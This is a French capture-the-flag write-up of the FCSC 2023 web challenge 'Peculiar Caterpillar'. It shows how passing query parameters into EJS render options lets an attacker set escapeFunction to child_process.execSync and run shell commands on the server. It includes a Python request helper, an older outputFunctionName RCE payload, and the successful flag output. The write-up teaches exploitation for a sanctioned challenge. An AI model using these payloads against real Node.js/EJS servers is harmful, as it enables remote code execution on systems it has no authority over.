---
title: "Peculiar Caterpillar | FCSC 2023"
date: 2023-04-28T12:00:00Z
description: "Voici un writeup complet du challenge Web 'Peculiar Caterpillar' créé par Bitk lors du FCSC 2023"
tags: ["nodejs","rendering","RCE","ejs","injection"]
keywords: ["nodejs", "RCE", "ejs-string"]
---
[//]: <> (Wrote By Vozec 28/04/2023)
---

# Introduction

```
Alors qu'elle se promenait au Pays des merveilles, Alice tomba sur une chenille étrange. À sa grande surprise, cette dernière se vantait d'avoir construit son propre site web en utilisant Javascript. Bien que le site semblait simple, Alice ne pouvait s'empêcher de se demander s'il était vraiment sécurisé.
```

Les sources de ce challenge sont fournies :

```bash
public
├── docker-compose.yml
├── Dockerfile
└── src
    ├── index.js
    ├── package.json
    ├── views
    │└── index.ejs
    └── yarn.lock
```

On retrouve 2 choses intéressantes dans ces fichiers:
- `/src/index.js`
- `/src/views/index.ejs`

Le premier fichier est un serveur codé en nodejs:

```js
require("express")().set("view engine", "ejs").use((req, res) => res.render("index", { name: "World", ...req.query })).listen(3000);
```

Le second est une **template html** pour le moteur de template `ejs`:

```html
...
<body>
    <main>
      <div id="bubble">Hello <%= name %></div>
    </main>
  </body>
...
```

# Première approche du challenge.

Le serveur renvoie notre `name` passé en paramètre de la requète GET;

```js
res.render("index", { name: "World", ...req.query })
```

Ainsi nous obtenons la page suivante sur https://peculiar-caterpillar.france-cybersecurity-challenge.fr/?name=vozec:  

![Alt text](./img/1.png)

Regardons maintenant comment fonctionne le code de `ejs` [ici](https://github.com/mde/ejs/blob/main/lib/ejs.js)

On a à la ligne *415*:

```js
exports.render = function (template, d, o) {
  var data = d || utils.createNullProtoObjWherePossible();
  var opts = o || utils.createNullProtoObjWherePossible();

  // No options object -- if there are optiony names
  // in the data, copy them to options
  if (arguments.length == 2) {
    utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA);
  }

  return handleCache(opts, template)(data);
};
```

D'après l'article de [mizu](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce), la fonction `createNullProtoObjWherePossible` ne semble pas vulnérable à des attaques SSPP sur les nouveaux objets crées.

![Alt text](./img/meme1.jpg)

# From SSPP to RCE.

Comme expliqué dans ce même article, nous devons nous intéresser à [cette fonction](https://github.com/mde/ejs/blob/f818bce2a5b72866f205c9284e8257f2b155aa66/lib/ejs.js#L571) qui a pour but de compiler une fonction pour évaluer la template html:

```js
compile: function () {
    /** @type {string} */
    var src;
    /** @type {ClientFunction} */
    var fn;
    var opts = this.opts;
    var prepended = '';
    var appended = '';
    /** @type {EscapeCallback} */
    var escapeFn = opts.escapeFunction;
    /** @type {FunctionConstructor} */
    var ctor;
    /** @type {string} */
    var sanitizedFilename = opts.filename ? JSON.stringify(opts.filename) : 'undefined';

   ...

   if (opts.compileDebug) {
      src = 'var __line = 1' + '\n'
        + '  , __lines = ' + JSON.stringify(this.templateText) + '\n'
        + '  , __filename = ' + sanitizedFilename + ';' + '\n'
        + 'try {' + '\n'
        + this.source
        + '} catch (e) {' + '\n'
        + '  rethrow(e, __lines, __filename, __line, escapeFn);' + '\n'
        + '}' + '\n';
    }
    else {
      src = this.source;
    }

    if (opts.client) {
      src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
      if (opts.compileDebug) {
        src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
      }
    }  
  ...
}
```

[Ce second article](https://eslam.io/posts/ejs-server-side-template-injection-rce/#the-rce-exploit-) nous présente une ancienne méthode pour RCE dans cette fonction. En effet, ce code ci était présent:

```js
prepended +=
    '  var __output = "";\n' +
    '  function __append(s) { if (s !== undefined && s !== null) __output += s }\n';
if (opts.outputFunctionName) {
    prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
}
```

Il suffisait alors d'injecter dans `opts.outputFunctionName` ce type de payload pour avoir une rce directe:

```js
var x;process.mainModule.require('child_process').execSync('touch /tmp/pwned');s= __append;
```

Ce code n'est plus d'actualité mais aujourd'hui nous avons ceci:

```js
if (opts.client) {
  src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
  if (opts.compileDebug) {
    src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
  }
}
```

Il se trouve que si `opts.client` est passé à `True`, notre paramètre `escapeFn` est placé dans la définition de la fonction `escapeFn`. Cette fonction étant appelée pour tous nos paramètres. Il serait intéressant de re-définir cette fonction pour qu'elle exécute son premier argument.

Nous devons donc:
  - passer `opts.client` à *true*
  - ré-écrire la fonction **escapeFn**
  - envoyer `name` qui sera évalué par notre fonction modifiée est qui sera éxecutée comme commande sur le serveur.

J'ai écris ce script pour envoyer efficacement mes paramètres au serveur:

```python
import requests
import html

url = 'https://peculiar-caterpillar.france-cybersecurity-challenge.fr'

def send(param):
    uri = '%s?%s'%(url,param)
    print('[+] Url params:')
    print('\t%s'%(param))
    print('[+] Final url: %s'%(uri))
    r = requests.get(uri).text
    try:
        r = html.unescape(r.split('div id="bubble">')[1].split('</div>')[0])
    except:
        r = html.unescape(r)
    return '\n[+] Result:\n\t%s'%(r)

param = f'''
param1=value1
...
name=vozec
'''[1:-1]

param = '&'.join(param.split('\n'))
print(send(param))
```

On peut aller chercher l'objet `viewOpts` en utilisant la clé `view options` pour modifier la configuration. On va ici remplacer **escapeFunction** par la fonction **execSync** présente dans le module `child_process`.
*(on ajoute ;// pour commenter le reste de la ligne)*

```python
param = f'''
debug=true
settings[view%20options][client]=true
settings[view%20options][escapeFunction]=global.process.mainModule.require('child_process').execSync;//
name=cat flag*
'''[1:-1]
```

*Résultat*:

```bash
[+] Url params:
    debug=true&settings[view%20options][client]=true&settings[view%20options][escapeFunction]=global.process.mainModule.require('child_process').execSync;//&name=cat flag*
[+] Final url: https://peculiar-caterpillar.france-cybersecurity-challenge.fr?debug=true&settings[view%20options][client]=true&settings[view%20options][escapeFunction]=global.process.mainModule.require('child_process').execSync;//&name=cat flag*

[+] Result:
    Hello FCSC{232448f3783105b36ab9d5f90754417a4f17931b4bdeeb6f301af2db0088cef6}
```

![Alt text](./img/2.png)

# Réferences:
- https://blog.yeswehack.com/talent-development/server-side-prototype-pollution-how-to-detect-and-exploit/
- https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce#final_poc
- https://eslam.io/posts/ejs-server-side-template-injection-rce/
- https://security.snyk.io/vuln/SNYK-JS-EJS-2803307

![Alt text](./img/Babar_Is_The_King.png)
